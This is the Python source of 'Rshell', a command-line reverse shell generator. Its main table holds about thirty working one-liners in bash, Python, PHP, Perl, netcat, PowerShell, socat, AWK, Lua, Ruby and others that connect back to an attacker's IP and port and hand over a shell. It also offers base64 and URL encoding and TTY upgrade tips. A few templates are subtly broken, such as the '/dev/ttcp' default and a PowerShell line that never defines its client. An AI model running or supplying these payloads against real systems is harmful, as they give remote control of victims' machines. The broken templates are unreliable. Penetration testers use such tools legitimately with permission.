#!/usr/bin/env python3

import argparse
import sys
import os
from typing import Dict, Optional
import re
import base64
from urllib.parse import quote as url_encode
from pathlib import Path

# Update color codes with more options
COLORS = {
    'BLUE': '\033[94m',
    'GREEN': '\033[92m',
    'YELLOW': '\033[93m',
    'RED': '\033[91m',
    'CYAN': '\033[96m',
    'MAGENTA': '\033[95m',  # New
    'WHITE': '\033[97m',    # New
    'ORANGE': '\033[38;5;208m',  # New
    'PURPLE': '\033[38;5;165m',  # New
    'NC': '\033[0m',  # No Color
    'BOLD': '\033[1m',
    'UNDERLINE': '\033[4m',  # New
    'BLINK': '\033[5m',      # New
    'BG_BLACK': '\033[40m',  # New
    'BG_RED': '\033[41m',    # New
    'BG_GREEN': '\033[42m'   # New
}

# Version information and metadata
__version__ = "1.0.0"
__author__ = "Ervis Tusha"
__github__ = "https://github.com/ErvisTusha/rshell"
__twitter__ = "https://x.com/ET"

#DO NOT MODIFY BELOW THIS LINE FROM HERE
def get_banner() -> str:
    """Generate banner with current color settings"""
    return f"""
{COLORS['BLUE']}
        ██████╗  ███████╗ ██╗  ██╗ ███████╗ ██╗     ██╗     
        ██╔══██╗ ██╔════╝ ██║  ██║ ██╔════╝ ██║     ██║     
        ██████╔╝ ███████╗ ███████║ █████╗   ██║     ██║     
        ██╔══██╗ ╚════██║ ██╔══██║ ██╔══╝   ██║     ██║     
        ██║  ██║ ███████║ ██║  ██║ ███████╗ ███████╗███████╗
        ╚═╝  ╚═╝ ╚══════╝ ╚═╝  ╚═╝ ╚══════╝ ╚══════╝╚══════╝{COLORS['NC']}

{COLORS['GREEN']}{COLORS['BOLD']}Rshell{COLORS['NC']} v{COLORS['YELLOW']}{__version__}{COLORS['NC']} - {COLORS['CYAN']}{COLORS['BOLD']}Advanced Reverse Shell Generator{COLORS['NC']}    {COLORS['GREEN']}{COLORS['BOLD']}From:{COLORS['NC']} {COLORS['RED']}{COLORS['BOLD']}{__author__}{COLORS['NC']}
{COLORS['GREEN']}{COLORS['BOLD']}GITHUB{COLORS['NC']}: {COLORS['YELLOW']}{COLORS['BOLD']}{__github__}{COLORS['NC']}   {COLORS['GREEN']}{COLORS['BOLD']}X:{COLORS['NC']} {COLORS['YELLOW']}{COLORS['BOLD']}{__twitter__}{COLORS['NC']}
                                {COLORS['GREEN']}{COLORS['BOLD']}LICENSE:{COLORS['NC']} {COLORS['YELLOW']}{COLORS['BOLD']}MIT{COLORS['NC']}
-----------------------------------------------------------------------
"""

# Updated help message with comprehensive categories
HELP_MESSAGE = f"""
{COLORS['BOLD']}Usage:{COLORS['NC']}
  {COLORS['CYAN']}{COLORS['BOLD']}rshell{COLORS['NC']} <ip> <port> [options]       {COLORS['BLUE']}{COLORS['BOLD']}# Generate reverse shell{COLORS['NC']}
  {COLORS['CYAN']}{COLORS['BOLD']}rshell{COLORS['NC']} --list                      {COLORS['BLUE']}{COLORS['BOLD']}# List all available shells{COLORS['NC']}
  {COLORS['CYAN']}{COLORS['BOLD']}rshell{COLORS['NC']} --version                   {COLORS['BLUE']}{COLORS['BOLD']}# Show version information{COLORS['NC']}

{COLORS['BOLD']}Required Arguments:{COLORS['NC']}
  {COLORS['GREEN']}{COLORS['BOLD']}ip{COLORS['NC']}                           Target IP address (e.g., 192.168.1.10)
  {COLORS['GREEN']}{COLORS['BOLD']}port{COLORS['NC']}                         Target port number (1-65535)

{COLORS['BOLD']}Core Options:{COLORS['NC']}
  {COLORS['GREEN']}{COLORS['BOLD']}-h, --help{COLORS['NC']}                    Show this help message
  {COLORS['GREEN']}{COLORS['BOLD']}-v, --version{COLORS['NC']}                Show version information
  {COLORS['GREEN']}{COLORS['BOLD']}--list{COLORS['NC']}                       List all available reverse shells
  {COLORS['GREEN']}{COLORS['BOLD']}--raw{COLORS['NC']}                        Output only the shell command without formatting
  {COLORS['GREEN']}{COLORS['BOLD']}--no-color{COLORS['NC']}                   Disable colored output

{COLORS['BOLD']}Shell Options:{COLORS['NC']}
  {COLORS['GREEN']}{COLORS['BOLD']}-l, --language{COLORS['NC']} <language>     Specify shell language (default: bash)
  {COLORS['GREEN']}{COLORS['BOLD']}--no-tips{COLORS['NC']}                    Disable shell stabilization tips

{COLORS['BOLD']}Output Options:{COLORS['NC']}
  {COLORS['GREEN']}{COLORS['BOLD']}-e, --encode{COLORS['NC']} <method>         Encode payload using specified method
                                    {COLORS['CYAN']}Supported encodings:{COLORS['NC']} base64, url
  {COLORS['GREEN']}{COLORS['BOLD']}-s, --save{COLORS['NC']} <file>            Save output to specified file

{COLORS['BOLD']}Available Shell Categories:{COLORS['NC']}
  {COLORS['YELLOW']}{COLORS['BOLD']}Basic Shells:{COLORS['NC']}
    bash            {COLORS['BLUE']}# Basic bash TCP reverse shell{COLORS['NC']}
    python          {COLORS['BLUE']}# Python socket-based reverse shell{COLORS['NC']}
    php             {COLORS['BLUE']}# Standard PHP reverse shell{COLORS['NC']}
    perl            {COLORS['BLUE']}# Perl socket-based reverse shell{COLORS['NC']}
    nc              {COLORS['BLUE']}# Netcat reverse shell{COLORS['NC']}
    ruby            {COLORS['BLUE']}# Ruby socket-based reverse shell{COLORS['NC']}

  {COLORS['YELLOW']}{COLORS['BOLD']}Extended Shells:{COLORS['NC']}
    powershell      {COLORS['BLUE']}# PowerShell reverse shell{COLORS['NC']}
    java            {COLORS['BLUE']}# Java runtime reverse shell{COLORS['NC']}
    golang          {COLORS['BLUE']}# Go TCP reverse shell{COLORS['NC']}
    socat           {COLORS['BLUE']}# Socat reverse shell{COLORS['NC']}
    awk             {COLORS['BLUE']}# AWK reverse shell{COLORS['NC']}
    lua             {COLORS['BLUE']}# Lua socket-based reverse shell{COLORS['NC']}

  {COLORS['YELLOW']}{COLORS['BOLD']}Shell Variants:{COLORS['NC']}
    python-export   {COLORS['BLUE']}# Python with environment variables{COLORS['NC']}
    bash-196        {COLORS['BLUE']}# Bash using file descriptor 196{COLORS['NC']}
    nc-mkfifo       {COLORS['BLUE']}# Netcat with named pipe{COLORS['NC']}
    php-system      {COLORS['BLUE']}# PHP using system(){COLORS['NC']}
    php-passthru    {COLORS['BLUE']}# PHP using passthru(){COLORS['NC']}
    php-shell_exec  {COLORS['BLUE']}# PHP using shell_exec(){COLORS['NC']}
    php-popen       {COLORS['BLUE']}# PHP using popen(){COLORS['NC']}
    perl-pipe       {COLORS['BLUE']}# Perl using pipe{COLORS['NC']}
    perl-fork       {COLORS['BLUE']}# Perl using fork{COLORS['NC']}

{COLORS['BOLD']}Features:{COLORS['NC']}
  - Multiple shell language support with variants
  - Base64 and URL encoding support
  - Shell stabilization tips for supported languages
  - Command output saving to file
  - Color-coded output (can be disabled)
  - Raw output mode for scripting
  - Comprehensive shell documentation

{COLORS['BOLD']}Examples:{COLORS['NC']}
  {COLORS['CYAN']}{COLORS['BOLD']}Basic Usage:{COLORS['NC']}
    rshell 192.168.1.10 4444                    {COLORS['BLUE']}# Basic bash shell{COLORS['NC']}
    rshell 10.0.0.1 9001 -l python              {COLORS['BLUE']}# Python reverse shell{COLORS['NC']}
  
  {COLORS['CYAN']}{COLORS['BOLD']}Advanced Usage:{COLORS['NC']}
    rshell 192.168.1.10 4444 -e base64          {COLORS['BLUE']}# Base64 encoded payload{COLORS['NC']}
    rshell 192.168.1.10 4444 -s shell.txt       {COLORS['BLUE']}# Save to file{COLORS['NC']}
    rshell 192.168.1.10 4444 --raw              {COLORS['BLUE']}# Output only the command{COLORS['NC']}
    rshell 192.168.1.10 4444 -l php --no-tips   {COLORS['BLUE']}# PHP shell without tips{COLORS['NC']}
"""
# UNTIL HERE

# Shell code templates for various languages
SHELL_CODES: Dict[str, str] = {
    "bash": "/bin/bash -i >& /dev/ttcp/{ip}/{port} 0>&1",
    "python": (
        "python -c 'import socket,subprocess,os;"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        "s.connect((\"{ip}\",{port}));"
        "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
        "p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    ),
    "php": (
        "php -r '$sock=fsockopen(\"{ip}\",{port});"
        "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    ),
    "perl": (
        "perl -e 'use Socket;$i=\"{ip}\";$p={port};"
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        "if(connect(S,sockaddr_in($p,inet_aton($i))))"
        "{open(STDIN,\">&S\");open(STDOUT,\">&S\");"
        "open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    ),
    "nc": "nc -e /bin/sh {ip} {port}",
    "ncat": "ncat {ip} {port} -e /bin/sh",
    "ruby": (
        "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{ip}\",{port}))'"
    ),
    "powershell": (
        "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object "
        "System.Net.Sockets.TCPClient(\"{ip}\",{port});"
        "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)"
        "{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        "$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);"
        "$stream.Flush()};$client.Close()"
    ),
    "java": (
        "r = Runtime.getRuntime();p = r.exec([\"/bin/sh\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};"
        "cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]);"
        "p.waitFor()"
    ),
    "golang": (
        "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");"
        "cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go"
    ),
    "socat": "socat TCP:{ip}:{port} EXEC:/bin/sh",
    "awk": (
        "awk 'BEGIN {s = \"/inet/tcp/0/{ip}/{port}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c;"
        "if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
    ),
    "lua": (
        "lua -e \"require('socket');require('os');"
        "t=socket.tcp();t:connect('{ip}','{port}');"
        "os.execute('/bin/sh -i <&3 >&3 2>&3');\""
    ),
    "nodejs": (
        "require('child_process').exec('nc -e /bin/sh {ip} {port}')"
    ),
    "telnet": "TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | /bin/sh 1>$TF",
    "zsh": "zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",

    # Additional PHP variants
    "php-system": (
        "php -r '$sock=fsockopen(\"{ip}\",{port});system(\"/bin/sh -i <&3 >&3 2>&3\");'"
    ),
    "php-passthru": (
        "php -r '$sock=fsockopen(\"{ip}\",{port});passthru(\"/bin/sh -i <&3 >&3 2>&3\");'"
    ),
    "php-shell_exec": (
        "php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    ),
    "php-popen": (
        "php -r '$sock=fsockopen(\"{ip}\",{port});popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'"
    ),
    "php-proc_open": (
        "php -r '$sock=fsockopen(\"{ip}\",{port});$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"
    ),
    
    # SSH
    "ssh-reverse": "ssh -o StrictHostKeyChecking=no -R 9999:localhost:{port} {ip}",
    
    # Additional Perl variants
    "perl-pipe": (
        "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    ),
    "perl-fork": (
        "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
    ),
    
    # Python variants
    "python-export": (
        "export RHOST=\"{ip}\";export RPORT={port};"
        "python -c 'import sys,socket,os,pty;s=socket.socket();"
        "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));"
        "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];"
        "pty.spawn(\"/bin/sh\")'"
    ),
    "python-short": (
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        "s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
        "os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    ),
    
    # Additional bash variants
    "bash-196": "0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",
    "bash-tcp": "/bin/bash -l > /dev/tcp/{ip}/{port} 0<&1 2>&1",
    
    # Netcat variants
    "nc-mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
    "nc-e": "nc -e /bin/sh {ip} {port}",
    "nc-c": "nc -c /bin/sh {ip} {port}",
    
    # Extended Ruby
    "ruby-shell": (
        "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;"
        "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    ),
    
    # Extended xterm
    "xterm": "xterm -display {ip}:{port}",
}

# Enhance shell stabilization tips
SHELL_TIPS = {
    "python": {
        "basic": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
        "full": [
            "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
            "export TERM=xterm",
            "^Z (Ctrl+Z)",
            "stty raw -echo; fg",
            "reset",
            "stty rows 40 columns 160"
        ]
    },
    "bash": {
        "basic": "SHELL=/bin/bash script -q /dev/null",
        "full": [
            "SHELL=/bin/bash script -q /dev/null",
            "export TERM=xterm",
            "stty rows 40 columns 160"
        ]
    },
    "perl": {
        "basic": "perl -e 'exec \"/bin/bash\";'",
        "full": [
            "perl -e 'exec \"/bin/bash\";'",
            "export TERM=xterm",
            "stty rows 40 columns 160"
        ]
    },
    "nc": {
        "basic": "nc -lvp 4444",
        "full": [
            "nc -lvp 4444",
            "stty raw -echo; fg",
            "reset",
            "stty rows 40 columns 160"
        ]
    },
    "ruby": {
        "basic": "ruby -rsocket -e'f=TCPSocket.open(\",4444\").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "full": [
            "ruby -rsocket -e'f=TCPSocket.open(\",4444\").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "export TERM=xterm",
            "stty rows 40 columns 160"
        ]
    },
    "lua": {
        "basic": "lua -e 'os.execute(\"/bin/sh\")'",
        "full": [
            "lua -e 'os.execute(\"/bin/sh\")'",
            "export TERM=xterm",
            "stty rows 40 columns 160"
        ]
    },
    "awk": {
        "basic": "awk 'BEGIN {system(\"/bin/bash\")}'",
        "full": [
            "awk 'BEGIN {system(\"/bin/bash\")}'",
            "export TERM=xterm",
            "stty rows 40 columns 160"
        ]
    }
}

# Add shell descriptions
SHELL_DESCRIPTIONS = {
    'Basic': {
        'bash': 'Basic bash TCP reverse shell',
        'python': 'Python socket-based reverse shell',
        'php': '[★] Standard PHP reverse shell (recommended)',
        'perl': 'Perl socket-based reverse shell',
        'nc': 'Netcat reverse shell with -e option',
        'ruby': 'Ruby socket-based reverse shell'
    },
    'Extended': {
        'powershell': 'PowerShell reverse shell with stream handling',
        'java': 'Java runtime reverse shell',
        'golang': 'Go TCP reverse shell',
        'socat': 'Socat reverse shell',
        'awk': 'AWK reverse shell',
        'lua': 'Lua socket-based reverse shell'
    },
    'Variants': {
        'php-system': '[+] PHP shell using system() - works when exec is disabled',
        'php-passthru': '[+] PHP shell using passthru() - useful for binary streams',
        'php-shell_exec': '[+] PHP shell using shell_exec() - alias for backticks', 
        'php-popen': '[+] PHP shell using popen() - runs command in pipe',
        'php-proc_open': '[+] PHP shell using proc_open() - full I/O control',
        'perl-pipe': 'Perl reverse shell using pipe',
        'perl-fork': 'Perl reverse shell using fork',
        'python-export': 'Python reverse shell using environment variables',
        'bash-196': 'Bash reverse shell using file descriptor 196',
        'nc-mkfifo': 'Netcat reverse shell using named pipe',
        'python-short': 'Shortened Python reverse shell',
        'bash-tcp': 'Bash reverse shell using TCP',
        'nc-e': 'Netcat reverse shell with -e flag',
        'nc-c': 'Netcat reverse shell with -c flag',
        'ruby-shell': 'Ruby reverse shell with file descriptor',
        'xterm': 'X11 terminal reverse shell'
    }
}

def validate_input(ip: str, port: int) -> tuple[str, int]:
    """
    Validate and sanitize both IP and port.
    Returns sanitized (ip, port) tuple or raises ValueError.
    """
    # Sanitize and validate IP
    ip = re.sub(r'[;&|`$]', '', ip)
    try:
        parts = ip.split('.')
        if len(parts) != 4 or not all(0 <= int(part) <= 255 for part in parts):
            print(get_banner())
            print(f"\n{COLORS['BG_RED']}{COLORS['WHITE']} ERROR: {COLORS['NC']} Invalid IP address format: {COLORS['RED']}{ip}{COLORS['NC']}")
            print(f"\n-----------------------------------------------------------------------")
            show_mini_help()
            sys.exit(1)
    except (AttributeError, TypeError, ValueError):
        print(get_banner())
        print(f"\n{COLORS['BG_RED']}{COLORS['WHITE']} ERROR: {COLORS['NC']} Invalid IP address format: {COLORS['RED']}{ip}{COLORS['NC']}")
        print(f"\n-----------------------------------------------------------------------")
        show_mini_help()
        sys.exit(1)
    
    # Port validation is now handled by argparse
    return ip, port

def encode_payload(payload: str, encoding: str = None) -> str:
    """Encode the payload using specified method."""
    if (encoding == 'base64'):
        return base64.b64encode(payload.encode()).decode()
    elif (encoding == 'url'):
        return url_encode(payload)
    return payload

def show_shell_tips(language: str) -> None:
    """Display enhanced shell stabilization tips with more colors"""
    base_lang = language.split('-')[0]
    if tips := SHELL_TIPS.get(base_lang):
        print(f"\n{COLORS['YELLOW']}{COLORS['BOLD']} Shell Stabilization Tips {COLORS['NC']}")
        print(f"\n{COLORS['PURPLE']}{COLORS['BOLD']}Basic upgrade:{COLORS['NC']}")
        print(f"{COLORS['WHITE']}${COLORS['NC']} {COLORS['GREEN']}{tips['basic']}{COLORS['NC']}")
        
        print(f"\n{COLORS['PURPLE']}{COLORS['BOLD']}Full TTY upgrade process:{COLORS['NC']}")
        for i, step in enumerate(tips['full'], 1):
            print(f"{COLORS['CYAN']}{i}.{COLORS['NC']} {COLORS['GREEN']}{step}{COLORS['NC']}")

def generate_reverse_shell(ip: str, port: int, language: str) -> Optional[str]:
    """Generate the reverse shell code based on selected language."""
    # Validate both IP and port at once
    ip, port = validate_input(ip, port)
    
    shell_code_template = SHELL_CODES.get(language.lower())
    if not shell_code_template:
        raise ValueError(f"Unsupported language: {language}")
    
    return shell_code_template.format(ip=ip, port=port)

def init_colors() -> None:
    """Initialize colors for Windows terminal."""
    if os.name == 'nt':  # For Windows
        os.system('color')

def show_version() -> None:
    """Display version banner with colors if supported."""
    print(get_banner())
    sys.exit(0)

def get_mini_help() -> str:
    """Return minimal usage help with current color settings"""
    return f"""
{COLORS['CYAN']}{COLORS['BOLD']}Usage:{COLORS['NC']}
  {COLORS['GREEN']}./rshell.py{COLORS['NC']} <ip> <port>          {COLORS['BLUE']}# Basic usage{COLORS['NC']}
  {COLORS['GREEN']}./rshell.py{COLORS['NC']} <ip> <port> -l php   {COLORS['BLUE']}# Specify language{COLORS['NC']}
  {COLORS['GREEN']}./rshell.py{COLORS['NC']} --help               {COLORS['BLUE']}# Show full help{COLORS['NC']}
  {COLORS['GREEN']}./rshell.py{COLORS['NC']} --list               {COLORS['BLUE']}# List all available shells{COLORS['NC']} 
"""

def show_help() -> None:
    """Display detailed help information with colors."""
    print(get_banner())  # Add banner before help message
    print(HELP_MESSAGE)
    sys.exit(0)

def show_mini_help() -> None:
    """Display minimal usage help"""
    print(get_mini_help())

class RshellArgumentParser(argparse.ArgumentParser):
    def format_help(self):
        return f"{get_banner()}\n{get_mini_help()}"  # Add banner to argument parser help

    def error(self, message):
        """Custom error handler with minimal help"""
        if "port" in message.lower():
            print(f"\n{COLORS['BG_RED']}{COLORS['WHITE']} ERROR: {COLORS['NC']} {message}")
            show_mini_help()
        else:
            print(f"\n{COLORS['BG_RED']}{COLORS['WHITE']} ERROR: {COLORS['NC']} {message}")
            print(f"{get_banner()}\n{get_mini_help()}")  # Add banner to error messages
        sys.exit(1)

def validate_language(value):
    """Validate the language argument"""
    if value not in SHELL_CODES:
        print(get_banner()) 
        print(f"\n{COLORS['BG_RED']}{COLORS['WHITE']} ERROR: {COLORS['NC']} Invalid language '{value}'")
        print(f"\n-----------------------------------------------------------------------")
        list_shells()
        sys.exit(1)
    return value

def print_raw_shell(shell_command: str) -> None:
    """Print only the shell command without any formatting"""
    print(shell_command)

def disable_colors() -> None:
    """Disable all colors by setting them to empty strings."""
    for key in COLORS:
        COLORS[key] = ''

def print_security_warning() -> None:
    """Display security warning."""
    print(f"""
{COLORS['RED']}[!] Security Warning:{COLORS['NC']}
This tool generates reverse shell commands that could be dangerous.
Only use on systems you have explicit permission to test.
Some commands may be flagged by security tools.
-------------------------------------------------------------------
    """)

def validate_save_path(value: str) -> Path:
    """Validate the save path with security checks"""
    if not value:
        print(get_banner())
        print(f"\n{COLORS['BG_RED']}{COLORS['WHITE']} ERROR: {COLORS['NC']} Output file path cannot be empty")
        print(f"\n-----------------------------------------------------------------------")
        show_mini_help()
        sys.exit(1)
        
    try:
        path = Path(value).resolve()
        
        # Check for directory
        if path.is_dir():
            print(get_banner())
            print(f"\n{COLORS['BG_RED']}{COLORS['WHITE']} ERROR: {COLORS['NC']} '{value}' is a directory")
            print(f"\n-----------------------------------------------------------------------")
            show_mini_help()
            sys.exit(1)
            
        # Check parent directory exists and is writable
        parent = path.parent
        if not parent.exists():
            print(get_banner())
            print(f"\n{COLORS['BG_RED']}{COLORS['WHITE']} ERROR: {COLORS['NC']} Directory '{parent}' does not exist")
            print(f"\n-----------------------------------------------------------------------")
            show_mini_help()
            sys.exit(1)

        if not os.access(parent, os.W_OK):
            print(get_banner())
            print(f"\n{COLORS['BG_RED']}{COLORS['WHITE']} ERROR: {COLORS['NC']} No write permission for '{parent}'")
            print(f"\n-----------------------------------------------------------------------")
            show_mini_help()
            sys.exit(1)
        # Basic path sanitation
        if '..' in str(path) or '~' in str(path):
            print(get_banner())
            print(f"\n{COLORS['BG_RED']}{COLORS['WHITE']} ERROR: {COLORS['NC']} Path cannot contain '..' or '~'")
            print(f"\n-----------------------------------------------------------------------")
            show_mini_help()
            sys.exit(1)
            
        # Check for suspicious characters
        if re.search(r'[;&|`$]', str(path)):
            print(get_banner())
            print(f"\n{COLORS['BG_RED']}{COLORS['WHITE']} ERROR: {COLORS['NC']} Path contains invalid characters")
            print(f"\n-----------------------------------------------------------------------")
            show_mini_help()
            sys.exit(1)
            
        return path
            
    except OSError as e:
        print(get_banner())
        print(f"\n{COLORS['BG_RED']}{COLORS['WHITE']} ERROR: {COLORS['NC']} Invalid path: {str(e)}")
        print(f"\n-----------------------------------------------------------------------")
        sys.exit(1)

def main() -> None:
    """Main function to handle command-line interface."""
    parser = RshellArgumentParser(
        description="Rshell - Advanced Reverse Shell Generator",
        epilog="Use responsibly and only on systems you have permission to test.",
        add_help=False,
        allow_abbrev=False
    )
    
    # First, handle --no-color before any other processing
    if "--no-color" in sys.argv:
        disable_colors()
    
    init_colors()  # Initialize colors after potential disabling
    
    # Create argument groups for better organization
    required = parser.add_argument_group('required arguments')
    optional = parser.add_argument_group('optional arguments')
    
    # Make ip and port positional but optional
    required.add_argument("ip", nargs='?', 
                         help="Target IP address")
    required.add_argument("port", nargs='?',
                         help="Target port number (1-65535)",  # Improved help message
                         type=lambda x: validate_port(x))  # Custom port validator
    
    # Modified language argument to use custom validation
    optional.add_argument(
        "-l", "--language",
        type=validate_language,
        default="bash",
        help="Specify the shell language (default: bash)",
        metavar="LANGUAGE"
    )
    
    optional.add_argument(
        "-v", "--version",
        action="store_true",
        help="Show version information"
    )
    optional.add_argument(
        "-h", "--help",
        action="store_true",
        help="Show this help message"
    )
    optional.add_argument(
        "--list",
        action="store_true",
        help="List all available reverse shells"
    )
    optional.add_argument(
        "-e", "--encode",
        choices=['base64', 'url'],
        help="Encode the payload"
    )
    optional.add_argument(
        "-s", "--save",
        type=validate_save_path,
        help="Save output to file"
    )
    optional.add_argument(
        "--no-tips",
        action="store_true",
        help="Don't show shell stabilization tips"
    )
    optional.add_argument(
        "--raw",
        action="store_true",
        help="Show only the reverse shell command without any additional output"
    )
    optional.add_argument(
        "--no-color",
        action="store_true",
        help="Disable colored output"
    )

    try:
        args = parser.parse_args()
        
        # First, handle --no-color before any output
        if args.no_color:
            disable_colors()
        
        # Handle special commands first
        if args.version:
            show_version()
            return
            
        if args.help:
            show_help()
            return
            
        if args.list:
            list_shells()
            return

        # Show help if no arguments provided
        if len(sys.argv) == 1:
            show_help()
            return

        # Validate required arguments for normal operation
        if args.ip is None:
            print(get_banner())
            print(f"\n{COLORS['BG_RED']}{COLORS['WHITE']} ERROR: {COLORS['NC']} IP address and port number are required")
            print(f"\n-----------------------------------------------------------------------") 
            show_mini_help()
            sys.exit(1)
            
        if args.port is None:
            print(get_banner())
            print(f"\n{COLORS['BG_RED']}{COLORS['WHITE']} ERROR: {COLORS['NC']} Port number is required")
            print(f"\n-----------------------------------------------------------------------")
            show_mini_help()
            sys.exit(1)

        # Main logic
        ip, port = validate_input(args.ip, args.port)
        shell_command = generate_reverse_shell(ip, port, args.language)
        
        if args.encode:
            shell_command = encode_payload(shell_command, args.encode)

        if args.raw:
            print_raw_shell(shell_command)
        else:
            # Show banner first if not in raw mode
            print(get_banner())
            print_security_warning()
            print(f"\n{shell_command}\n")
            show_similar_shells(args.language, args.ip, args.port)
            
            if not args.no_tips:
                show_shell_tips(args.language)

        if args.save:
            try:
                args.save.write_text(shell_command)
                if not args.raw:
                    print(f"{COLORS['BG_GREEN']}{COLORS['WHITE']} SUCCESS {COLORS['NC']} Command saved to {COLORS['CYAN']}{args.save}{COLORS['NC']}")
            except OSError as e:
                print(f"\n{COLORS['BG_RED']}{COLORS['WHITE']} ERROR: {COLORS['NC']} Failed to save file: {COLORS['RED']}{str(e)}{COLORS['NC']}")
                sys.exit(1)

    except argparse.ArgumentError as e:
        print(get_banner())
        print(f"\n{COLORS['BG_RED']}{COLORS['WHITE']} ERROR: {COLORS['NC']} {str(e)}")
        print(f"\n-----------------------------------------------------------------------")
        show_help()
        sys.exit(1)
    except ValueError as e:
        print(get_banner())
        print(f"\n{COLORS['BG_RED']}{COLORS['WHITE']} ERROR: {COLORS['NC']} {str(e)}")
        print(f"\n-----------------------------------------------------------------------")
        sys.exit(1)
    except Exception as e:
        print(get_banner())
        print(f"\n{COLORS['BG_RED']}{COLORS['WHITE']} ERROR: {COLORS['NC']} Unexpected error: {str(e)}")
        print(f"\n-----------------------------------------------------------------------")
        sys.exit(1)

def validate_port(value: str) -> int:
    """Validate port number with enhanced error handling"""
    try:
        cleaned_value = value.replace(',', '').strip()
        port = int(cleaned_value)
        if not 1 <= port <= 65535:
            print(get_banner())
            print(f"\n{COLORS['BG_RED']}{COLORS['WHITE']} ERROR: {COLORS['NC']} Port {port} is out of valid range (1-65535)")
            print(f"\n-----------------------------------------------------------------------")        
            show_mini_help()
            sys.exit(1)
        return port
    except ValueError:
        print(get_banner())
        print(f"\n{COLORS['BG_RED']}{COLORS['WHITE']} ERROR: {COLORS['NC']} Invalid port format: '{value}'")
        print(f"\n-----------------------------------------------------------------------")
        show_mini_help()
        sys.exit(1)

def show_similar_shells(language: str, ip: str, port: int) -> None:
    """Display similar shell variants with enhanced colors and formatting"""
    base_lang = language.split('-')[0]  # Get base language (e.g., 'php' from 'php-system')
    similar = [
        shell for shell in SHELL_CODES.keys()
        if shell.startswith(base_lang + '-') or shell == base_lang
    ]

    if len(similar) > 1:
        print("\n" + "-" * 65)
        print(f"\n{COLORS['YELLOW']}{COLORS['BOLD']} Alternative Shell Methods {COLORS['NC']}\n")
        for shell in similar:
            if shell != language:
                desc = next((desc for category in SHELL_DESCRIPTIONS.values() 
                           for s, desc in category.items() if s == shell), "")
                print(f"{COLORS['CYAN']}{COLORS['BOLD']}{shell:<15}{COLORS['NC']} {COLORS['WHITE']}│{COLORS['NC']} {COLORS['GREEN']}{desc}{COLORS['NC']}")
        print("\n" + "-" * 65 + "\n")

def list_shells() -> None:
    """Display all available reverse shells with enhanced colors"""
    print(f"\n{COLORS['BOLD']}{COLORS['UNDERLINE']}Available Reverse Shells:{COLORS['NC']}\n")
    
    for category, shells in SHELL_DESCRIPTIONS.items():
        print(f"{COLORS['BG_BLACK']}{COLORS['YELLOW']}{COLORS['BOLD']} {category} {COLORS['NC']}")
        for shell, desc in shells.items():
            print(f"  {COLORS['CYAN']}{COLORS['BOLD']}{shell:<15}{COLORS['NC']} {COLORS['WHITE']}│{COLORS['NC']} {COLORS['GREEN']}{desc}{COLORS['NC']}")
        print()  # Add blank line between categories
    sys.exit(0)

if __name__ == "__main__":
    main()
